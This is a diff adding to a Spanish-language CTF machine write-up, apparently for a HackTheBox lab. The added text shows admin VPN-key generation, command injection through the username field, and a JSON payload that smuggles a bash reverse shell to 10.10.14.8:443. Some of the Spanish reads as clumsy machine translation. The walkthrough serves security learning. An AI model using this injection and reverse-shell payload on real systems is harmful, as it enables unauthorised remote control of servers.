@@ -273,3 +273,37 @@ Si vuelvo a verificar mi autenticacion como admin me dice que si
 Como mi cuenta es ahora un administrador, ya no obtengo una respuesta 401 de /api/v1/admin/vpn/generate:
 ![Branching](../../../assets/images/wiretups/two_million/admin-vpn.png)
 
+Añadi mi nombre de usuario, y genera una clave VPN:
+Previo a eso hay que modificar el content type a json,cambiar el metodo a POST y poner el parametro username
+
+```js
+{
+"username":"brian"
+}
+```
+
+
+
+![Branching](../../../assets/images/wiretups/two_million/VPN-ADMIN.png)
+Mi cuenta es ahora admin.
+
+# Inyección
+
+Probablemente no sea el código PHP que genera una tecla VPN, sino algunas herramientas de Bash que generan la información necesaria para una tecla VPN.
+
+Vale la pena comprobar si hay alguna inyección de comando.
+
+Si el servidor está haciendo algo parecido gen_vpn.sh [username], entonces, intentaré poner un ;en el nombre de usuario para dividir eso en un nuevo comando. Ill también añadir un #al final para comentar cualquier cosa que pueda venir después de mi aportación. Funciona:
+
+![Branching](../../../assets/images/wiretups/two_million/rce.png)
+
+## Shell
+
+Para conseguir una reverse-shell, empezaré. ncescuchando a mi anfitrión, y pon una cáscara inversa como el nombre de usuario:
+
+```js
+{
+"username":"brian ; bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1' #"    
+}
+```
+![Branching](../../../assets/images/wiretups/two_million/reverse-shell.png)
